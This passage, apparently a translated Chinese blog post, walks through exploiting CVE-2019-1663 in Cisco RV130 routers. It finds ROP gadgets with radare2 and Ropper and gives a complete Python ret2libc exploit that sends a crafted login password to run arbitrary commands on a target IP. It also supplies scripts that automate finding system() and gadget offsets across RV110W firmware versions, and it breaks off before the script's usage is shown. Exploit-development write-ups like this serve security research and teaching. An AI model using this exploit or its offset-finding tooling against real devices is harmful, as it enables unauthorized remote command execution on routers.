
## 分析

```
radare2 -A libc.so.0
[x] Analyze all flags starting with sym. and entry0 (aa)
[Value from 0x00000000 to 0x0005cfec
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[0x0000bbc0]> afl | grep system
0x0003ed84 1 72 sym.svcerr_systemerr
0x0004d144 7 328 sym.system
```

同时也可以在`GDB`动态调试：

```
gef➤ b system
Breakpoint 1 at 0x35848144
```

从`GDB`得到的值只是函数偏移量(0x0004d144添加到`libc`的`map`)

0x357fb000)。

我们得到了系统地址，现在我们需要找到我们的小工具。要做到这一点，我将依靠[`Ropper`](https://github.com/sashs/Ropper)。

```
(ropper)> file libc.so.0
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(libc.so.0/ELF/ARM)> search mov r0, sp
[INFO] Searching for gadgets: mov r0, sp
[INFO] File: libc.so.0
0x00010d08: mov r0, sp; bl #0xba64; add sp, sp, #0x14; pop {r4, r5, r6, r7, pc};
0x00028700: mov r0, sp; bl #0xba64; mov r0, r4; add sp, sp, #0x10; pop {r4, r5, r6, pc};
0x00028764: mov r0, sp; bl #0xba64; mov r0, r4; add sp, sp, #0x14; pop {r4, r5, pc};
0x00018964: mov r0, sp; bl #0xba64; mov r0, r4; add sp, sp, #0x14; pop {r4, r5, r6, r7, pc};
0x0002868c: mov r0, sp; bl #0xba64; mov r0, r6; add sp, sp, #0x14; pop {r4, r5, r6, r7, pc};
0x0004ab0c: mov r0, sp; bl #0xf170; add sp, sp, #0xc; pop {r4, r5, pc};
0x00041308: mov r0, sp; blx r2;
0x00041308: mov r0, sp; blx r2; add sp, sp, #0x1c; ldm sp!, {pc}; mov r0, #1; bx lr;
0x00037884: mov r0, sp; blx r3;
--snip--
```

在我看来，最有趣的是位于`0x00041308`的那个指令，这意味着我们需要找到一个小工具，把`r2`从堆栈中取出来。

```
(libc.so.0/ELF/ARM)> search pop {r2
[INFO] Searching for gadgets: pop {r2
[INFO] File: libc.so.0
0x00052620: pop {r2, r3}; bx lr;
0x00052620: pop {r2, r3}; bx lr; push {r1, lr}; mov r0, #8; bl #0xbba8; pop {r1, pc};
```

没什么有趣的，让我们切换到`Thumb`模式，看看是否有什么事情发生:

```
(libc.so.0/ELF/ARM)> arch ARMTHUMB
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
(libc.so.0/ELF/ARMTHUMB)> search pop {r2
[INFO] Searching for gadgets: pop {r2
[INFO] File: libc.so.0
0x000060b8 (0x000060b9): pop {r2, r3, r4, r5, pc};
0x0003d1bc (0x0003d1bd): pop {r2, r3, r4, r5, r6, pc};
0x00020b98 (0x00020b99): pop {r2, r3, r4, r5, r6, r7, pc};
0x00053294 (0x00053295): pop {r2, r3, r4, r5, r7, pc};
0x0002a0e4 (0x0002a0e5): pop {r2, r3, r4, r6, r7, pc};
0x00027b80 (0x00027b81): pop {r2, r3, r4, r7, pc};
0x00020bd8 (0x00020bd9): pop {r2, r3, r5, r6, r7, pc};
0x0003d11c (0x0003d11d): pop {r2, r3, r5, r7, pc};
0x00020e38 (0x00020e39): pop {r2, r4, r6, pc};
0x00006eb8 (0x00006eb9): pop {r2, r5, r6, r7, pc};
0x00020e78 (0x00020e79): pop {r2, r6, pc};
0x000209f6 (0x000209f7): pop.w {r2, r6, r7, sl, ip, lr}; movs r4, r0; lsls r4, r1, #0x1d; movs r0, r0; blx lr;
0x000443ae (0x000443af): pop.w {r2, r6, r8, sb, fp, ip}; movs r2, r0; strh r4, [r0, r7]; movs r0, r0; blx lr;
```

现在我们可以使用位于`0x00020e79`的`gadget`了。

## 利用

所以让我们使用`python`写一个快速可行的利用:

```
#!/usr/bin/env python
"""
Exploit for Cisco RV130 stack-based buffer overflow (CVE-2019-1663).
This piece of code will execute a command on the device by using ret2libc
technique.
"""
import struct
import sys
import requests
offset = 446
libc\_base\_addr = 0x357fb000
system\_offset = 0x0004d144
gadget1 = 0x00020e79 # pop {r2, r6, pc};
gadget2 = 0x00041308 # mov r0, sp; blx r2;
def exploit(ip, cmd):
buf = "A" \* offset
buf += struct.pack("<L", libc\_base\_addr + gadget1)
buf += struct.pack("<L", libc\_base\_addr + system\_offset) # r2
buf += "XXXX" # r6
buf += struct.pack("<L", libc\_base\_addr + gadget2) #pc
buf += cmd
params = {
"submit\_button": "login",
"submit\_type": None,
"gui\_action": None,
"wait\_time": 0,
"change\_action": None,
"enc": 1,
"user": "cisco",
"pwd": buf,
"sel\_lang": "EN"
}
requests.post("<mark class="encrypted">18eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Q4x3U0g2K6i4K6u0r3L8r3!0Y4K9h3&6Q4x3X3g2U0k6$3V1`.</mark>" % ip, data=params, verify=False)
if \_\_name\_\_ == '\_\_main\_\_':
if len(sys.argv) < 3:
print("Usage: %s ip cmd" % (sys.argv[0]))
sys.exit(1)
exploit(sys.argv[1], sys.argv[2])
```

这个利用的思路如下：

我们用`gadget1`的地址覆盖程序计数器。当执行`gadget1` (`pop {r2, r6, pc}`)时，堆栈看起来是这样的:

![](upload/attach/201911/678772_HURRQ3XNE4FNNRA.png)

这意味着`r2`将保存`system`地址，`r6`保存一些无用的随机垃圾，`program counter`(`PC`)将保存`gadget2`地址，使程序跳转到该地址。

当执行`gadget2`时，堆栈看起来是这样的:

![](upload/attach/201911/678772_H9ZKR9U2RSHZQKZ.png)

然后我们转移到`r2`, `r2`保存了`system`的地址，以`r0`作为参数。给定`r0`指向堆栈，`system`将执行我们的命令。

## 工业化编写利用

找准`RV130`很容易，因为`libc`不会随着版本的不同而改变，这意味着所有的偏移量都是一样的，不管固件版本是什么:

```
find -name "libc.so.0" -exec sha1sum {} \;
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.0.21/lib/libc.so.0
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.1.3/lib/libc.so.0
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.2.7./lib/libc.so.0
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.3.14/lib/libc.so.0
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.3.16/lib/libc.so.0
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.3.22/lib/libc.so.0
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.3.28/lib/libc.so.0
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.3.44/lib/libc.so.0
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.3.45/lib/libc.so.0
a9cc842a0641dff43765c9110167316598252a5f ./RV130X\_FW\_1.0.3.51/lib/libc.so.0
```

然而，在调整`Metasploit`模块以支持`RV110W`和`RV215W`设备时，我面临着一个非常重复和无聊的任务:为每个固件版本查找偏移量。

因此，我编写了两个利用`radare2`和`Ropper`脚本功能的实用程序脚本。

第一个自动从提供的`libc`文件返回`system`地址:

```
#!/usr/bin/env python
import sys
import json
import r2pipe
import os
def get\_system\_offset(executable):
"""
Args:
executable(str): path to ELF file
Returns:
offset(int): address of system
"""
r = r2pipe.open(executable, flags=['-2'])
r.cmd('aa')
functions = json.loads(r.cmd("aflj"))
for f in functions:
if f['name'] == 'sym.system':
return hex(f['offset'])
r.quit()
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) < 2:
print("Usage: {} executable\_path".format(sys.argv[0]))
sys.exit(-1)
print("{} - {}".format(sys.argv[1], get\_system\_offset(sys.argv[1])))
```

以下是搜索系统的偏移在所有`RV110`固件版本:

```
find -type f -name 'libc.so.0' -exec ./find\_system.py {} \;
./firmwares/RV110W\_FW\_1.1.0.9/lib/libc.so.0 - 0x50d40
./firmwares/RV110W\_FW\_1.2.0.9/lib/libc.so.0 - 0x4c7e0
./firmwares/RV110W\_FW\_1.2.0.10/lib/libc.so.0 - 0x4c7e0
./firmwares/RV110W\_FW\_1.2.1.4/lib/libc.so.0 - 0x4c7e0
./firmwares/RV110W\_FW\_1.2.1.7/lib/libc.so.0 - 0x4c7e0
./firmwares/RV110W\_FW\_1.2.2.1/lib/libc.so.0 - 0x50d40
./firmwares/RV110W\_FW\_1.2.2.4/lib/libc.so.0 - 0x4c7e0
```

第二个是在一个文件中找到一个特定的`gadget`偏移量:

```
#!/usr/bin/env python
from ropper import RopperService
import sys
# not all options need to be given
options = {'color' : False, # if gadgets are printed, use colored output: default: False
'badbytes': '00', # bad bytes which should not be in addresses or ropchains; default: ''
'all' : False, # Show all gadgets, this means to not remove double gadgets; default: False
'inst\_count' : 6, # Number of instructions in a gadget; default: 6
'type' : 'all', # rop, jop, sys, all; default: all
'detailed' : False} # if gadgets are printed, use detailed output; default: False
rs = RopperService(options)
##### change options ######
rs.options.color = True
rs.options.badbytes = '00'
rs.options.badbytes = ''
rs.options.all = True
##### open binaries ######
# it is possible to open multiple files
rs.addFile(sys.argv[1], arch='MIPS')
# load gadgets for all opened files
rs.loadGadgetsFor()
result\_dict = rs.searchdict(search=sys.argv[2])
for file, gadgets in result\_dict.items():
print file
for gadget in gadgets:
print hex(gadget.address), gadget
```

用如下指令运行脚本：
